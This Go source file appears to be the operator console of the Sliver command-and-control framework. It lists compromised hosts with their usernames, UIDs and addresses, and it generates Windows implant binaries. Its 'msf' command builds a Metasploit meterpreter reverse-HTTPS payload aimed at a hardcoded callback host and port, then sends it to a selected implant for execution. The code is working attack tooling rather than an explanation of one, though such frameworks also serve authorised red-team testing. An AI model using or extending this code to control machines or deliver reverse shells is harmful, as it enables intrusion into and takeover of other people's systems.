package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"os"
	pb "sliver/protobuf"
	"strings"

	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh/terminal"
)

const (
	normal    = "\033[0m"
	black     = "\033[30m"
	red       = "\033[31m"
	green     = "\033[32m"
	orange    = "\033[33m"
	blue      = "\033[34m"
	purple    = "\033[35m"
	cyan      = "\033[36m"
	gray      = "\033[37m"
	bold      = "\033[1m"
	clearln   = "\r\x1b[2K"
	upN       = "\033[%dA"
	downN     = "\033[%dB"
	underline = "\033[4m"

	// Info - Display colorful information
	Info = bold + cyan + "[*] " + normal
	// Warn - Warn a user
	Warn = bold + red + "[!] " + normal
	// Debug - Display debug information
	Debug = bold + purple + "[-] " + normal
	// Woot - Display success
	Woot = bold + green + "[$] " + normal

	// Empty level
	Empty = ""
)

var (
	activeSliver *Sliver
	stdout       = bufio.NewWriter(os.Stdout)
	history      = []string{}
	cmdHandlers  = map[string]interface{}{
		"help":     help,
		"ls":       ls,
		"info":     info,
		"use":      use,
		"gen":      generate,
		"generate": generate,
		"msf":      msf,
	}
)

func startConsole(events chan *Sliver) {
	if !terminal.IsTerminal(0) || !terminal.IsTerminal(1) {
		log.Print("stdin/stdout should be terminal")
		return
	}
	oldState, err := terminal.MakeRaw(0)
	if err != nil {
		return
	}
	defer terminal.Restore(0, oldState)
	screen := struct {
		io.Reader
		io.Writer
	}{os.Stdin, os.Stdout}
	term := terminal.NewTerminal(screen, "")
	setPrompt(term)

	fmt.Fprintf(term, Info+"Welcome to the sliver shell, see `help` for available commands\n")

	reader := make(chan string) // Read lines in from user
	done := make(chan bool)     // Tell the reader the previous command has completed
	go lineReader(term, reader, done)
	for {
		select {
		case line := <-reader:
			fmt.Fprintln(term, "", line)
			if line == "exit" {
				return
			}
			words := strings.Fields(line)
			if cmd, ok := cmdHandlers[words[0]]; ok {
				cmd.(func(*terminal.Terminal, []string))(term, words[1:])
			} else {
				fmt.Fprintf(term, Warn+"Invalid command '%s'\n", words[0])
			}
			done <- true
		case sliver := <-events:
			fmt.Fprintf(term, Info+"%s - %s (%s) - %s/%s\n",
				sliver.Name, sliver.RemoteAddress, sliver.Hostname, sliver.Os, sliver.Arch)
		}
	}
}

func lineReader(term *terminal.Terminal, reader chan string, done chan bool) {
	defer close(reader)
	for {
		line, err := term.ReadLine()
		if err == io.EOF || strings.HasPrefix(line, "exit") {
			reader <- "exit"
			return
		}
		if err != nil {
			log.Printf("Error %v", err)
			reader <- "exit"
			return
		}
		if line == "" {
			continue
		} else {
			reader <- line
			<-done
		}
	}
}

func setPrompt(term *terminal.Terminal) {
	prompt := fmt.Sprintf(clearln + underline + "sliver" + normal)
	if activeSliver != nil {
		prompt += fmt.Sprintf(bold+red+" (%s)%s", activeSliver.Name, normal)
	}
	prompt += " > "
	term.SetPrompt(prompt)
}

func getSliverByName(name string) *Sliver {
	name = strings.ToUpper(name)
	hiveMutex.Lock()
	defer hiveMutex.Unlock()
	for _, sliver := range *hive {
		if sliver.Name == name {
			return sliver
		}
	}
	return nil
}

// ---------------- Commands ----------------
func help(term *terminal.Terminal, args []string) {

}

func ls(term *terminal.Terminal, args []string) {
	hiveMutex.Lock()
	defer hiveMutex.Unlock()
	if 0 < len(*hive) {
		fmt.Fprintf(term, "\nAvailable Slivers\n")
		fmt.Fprintf(term, "=================\n")
		index := 1
		for _, sliver := range *hive {
			fmt.Fprintf(term, " %d. %s (%s)\n", index, sliver.Name, sliver.RemoteAddress)
			index++
		}
		fmt.Fprintf(term, "\n")
	} else {
		fmt.Fprintln(term, Info+"No slivers connected\n")
	}
}

func info(term *terminal.Terminal, args []string) {
	var name *string
	if len(args) == 1 {
		name = &args[0]
	} else if activeSliver != nil {
		name = &activeSliver.Name
	}
	if name != nil {
		sliver := getSliverByName(*name)
		if sliver != nil {
			fmt.Fprintln(term, "")
			fmt.Fprintf(term, bold+"ID: %s%s\n", normal, sliver.ID)
			fmt.Fprintf(term, bold+"Name: %s%s\n", normal, sliver.Name)
			fmt.Fprintf(term, bold+"Hostname: %s%s\n", normal, sliver.Hostname)
			fmt.Fprintf(term, bold+"Username: %s%s\n", normal, sliver.Username)
			fmt.Fprintf(term, bold+"UID: %s%s\n", normal, sliver.Uid)
			fmt.Fprintf(term, bold+"GID: %s%s\n", normal, sliver.Gid)
			fmt.Fprintf(term, bold+"OS: %s%s\n", normal, sliver.Os)
			fmt.Fprintf(term, bold+"Arch: %s%s\n", normal, sliver.Arch)
			fmt.Fprintf(term, bold+"Remote Address: %s%s\n", normal, sliver.RemoteAddress)
			fmt.Fprintln(term, "")
		} else {
			fmt.Fprintf(term, Warn+"No sliver with name '%s'\n", args[0])
		}
	} else {
		fmt.Fprintln(term, Warn+"Missing sliver name\n")
	}
}

func use(term *terminal.Terminal, args []string) {
	if 0 < len(args) {
		sliver := getSliverByName(args[0])
		if sliver != nil {
			activeSliver = sliver
			setPrompt(term)
			fmt.Fprintf(term, Info+"Active sliver set to '%s'\n", activeSliver.Name)
		} else {
			fmt.Fprintf(term, Warn+"No sliver with name '%s'\n", args[0])
		}
	} else {
		fmt.Fprintln(term, Warn+"Missing sliver name\n")
	}
}

func generate(term *terminal.Terminal, args []string) {
	fmt.Fprintf(term, Info+"Generating new sliver binary, please wait ... \n")
	path, err := GenerateImplantBinary(windowsPlatform, "amd64", *server, uint16(*serverLPort))
	if err != nil {
		fmt.Fprintf(term, Warn+"Error generating sliver: %v\n", err)
	}
	fmt.Fprintf(term, Info+"Generated sliver binary at: %s\n", path)
}

func msf(term *terminal.Terminal, args []string) {
	if activeSliver != nil {
		fmt.Fprintf(term, Info+"Generating payload ...\n")
		config := VenomConfig{
			Os:         activeSliver.Os,
			Arch:       "x64",
			Payload:    "meterpreter_reverse_https",
			LHost:      "172.16.20.1",
			LPort:      4444,
			Encoder:    "",
			Iterations: 0,
			Encrypt:    "",
		}
		payload, err := MsfVenomPayload(config)
		if err != nil {
			fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
			return
		}
		fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(payload))

		fmt.Fprintf(term, Info+"Sending payload -> %s\n", activeSliver.Name)
		data, _ := proto.Marshal(&pb.Task{
			Encoder: "raw",
			Data:    payload,
		})
		(*activeSliver).Send <- pb.Envelope{
			Type: "task",
			Data: data,
		}
		fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
	} else {
		fmt.Fprintf(term, Warn+"Please select and active sliver via `use`\n")
	}
}
